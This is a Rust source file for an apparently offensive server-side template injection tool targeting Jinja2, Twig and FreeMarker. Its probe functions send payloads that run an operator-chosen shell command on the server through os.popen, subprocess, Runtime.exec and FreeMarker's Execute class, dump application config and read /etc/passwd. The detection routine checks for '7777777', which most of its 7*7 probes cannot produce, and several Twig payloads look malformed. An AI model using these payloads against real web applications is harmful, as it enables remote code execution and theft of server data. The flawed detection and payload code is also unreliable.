use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const MATH_MARKER: &str = "7777777";

pub async fn detect(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SSTI Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let probes: Vec<(&str, &str)> = vec![
        ("Jinja2/Twig", "{{7*7}}"),
        ("Jinja2 alt", "{{7*'7'}}"),
        ("FreeMarker", "${7*7}"),
        ("Velocity", "#set($x=7*7)${x}"),
        ("Smarty", "{7*7}"),
        ("Mako", "${7*7}"),
        ("Handlebars", "{{multiply 7 7}}"),
        ("ERB", "<%= 7*7 %>"),
        ("Django", "{% set x = 7*7 %}{{x}}"),
        ("StringTemplate", "$7*7$"),
        ("Slim", "= 7*7"),
        ("Pug", "#{7*7}"),
        ("Nunjucks", "{{7*7}}"),
        ("DotLiquid", "{{7 | times: 7}}"),
        ("Thymeleaf", "[[${7*7}]]"),
        ("Groovy", "${7*7}"),
    ];

    let mut detected = Vec::new();

    for (name, payload) in &probes {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if body.contains(MATH_MARKER) {
                    println!("{} [HIGH] SSTI detected: {} -> {}", "[!]".red().bold(), name.yellow(), MATH_MARKER);
                    detected.push(*name);
                }
            }
            Err(_) => {}
        }
    }

    if detected.is_empty() {
        println!("{} No SSTI detected with standard probes.", "[-]".yellow().bold());
    } else {
        println!("\n{} {} template engine(s) vulnerable:", "[*]".cyan().bold(), detected.len());
        for name in &detected {
            println!("  {} {}", "*".cyan(), name.yellow());
        }
    }
    Ok(())
}

pub async fn jinja(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    cmd: &str,
) -> anyhow::Result<()> {
    println!("{} Jinja2 SSTI Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} Cmd:   {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Config dump", format!("{{{{config}}}}")),
        ("Class walk", format!("{{{{''.__class__.__mro__[1].__subclasses__()}}}}")),
        ("OS popen", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].popen('{}').read()}}}}", 132, cmd)),
        ("OS system", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].system('{}')}}}}", 132, cmd)),
        ("Subprocess", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['subprocess'].check_output('{}',shell=True)}}}}", 132, cmd)),
        ("Import os", format!("{{{{__import__('os').popen('{}').read()}}}}", cmd)),
        ("Lipsum globals", format!("{{{{lipsum.__globals__['os'].popen('{}').read()}}}}", cmd)),
        ("Cycler globals", format!("{{{{cycler.__init__.__globals__.os.popen('{}').read()}}}}", cmd)),
    ];

    for (name, payload) in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if !body.is_empty() && body.len() > 10 && !body.contains("500") {
                    println!("{} [+] {}:", "[+]".green().bold(), name);
                    println!("    {}", body.chars().take(300).collect::<String>());
                } else {
                    println!("  {} {:20} no output", "*".cyan(), name);
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Jinja2 exploitation complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn twig(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    cmd: &str,
) -> anyhow::Result<()> {
    println!("{} Twig SSTI Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} Cmd:   {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads: Vec<(&str, String)> = vec![
        ("App object", "{{app}}".to_string()),
        ("App request", "{{app.request}}".to_string()),
        ("Env", "{{{app.request.server}}}".to_string()),
        ("Get env", "{{{app.request.server.get('HTTP_HOST')}}}".to_string()),
        ("File read", "{{{source('/etc/passwd')}}}".to_string()),
        ("String file", "{{{'/etc/passwd'|file_excerpt(1,50)}}}".to_string()),
        ("Exec via filter", "{{_self.env.registerFilter('exec')}}{{'exec'}}{{_self.env.getFilter('".to_string() + cmd + "')}}"),
        ("Debug", "{{{dump(app)}}}".to_string()),
        ("Class", "{{{[].getClass()}}}".to_string()),
        ("OS exec", "{{_self.env.registerFilter('exec')}}{{_self.env.getFilter('".to_string() + cmd + "')}}"),
    ];

    for (name, payload) in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if !body.is_empty() && body.len() > 10 {
                    println!("{} [+] {}:", "[+]".green().bold(), name);
                    println!("    {}", body.chars().take(300).collect::<String>());
                } else {
                    println!("  {} {:20} no output", "*".cyan(), name);
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Twig exploitation complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn freemarker(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    cmd: &str,
) -> anyhow::Result<()> {
    println!("{} FreeMarker SSTI Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} Cmd:   {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads: Vec<(&str, String)> = vec![
        ("Math", "${7*7}".to_string()),
        ("Object class", "${.object?class}".to_string()),
        ("Exec via Execute", "${'freemarker.template.utility.Execute'?new()('".to_string() + cmd + "')}"),
        ("Exec via ObjectConstructor", "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder',['".to_string() + cmd + "']).start()}"),
        ("API access", "${object?api.class}".to_string()),
        ("Static exec", "${statics['java.lang.Runtime'].getRuntime().exec('".to_string() + cmd + "')}"),
        ("Jython exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('".to_string() + cmd + "')}"),
        ("Version", "${.version}".to_string()),
    ];

    for (name, payload) in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if !body.is_empty() && body.len() > 5 {
                    println!("{} [+] {}:", "[+]".green().bold(), name);
                    println!("    {}", body.chars().take(300).collect::<String>());
                } else {
                    println!("  {} {:20} no output", "*".cyan(), name);
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} FreeMarker exploitation complete.", "[*]".cyan().bold());
    Ok(())
}
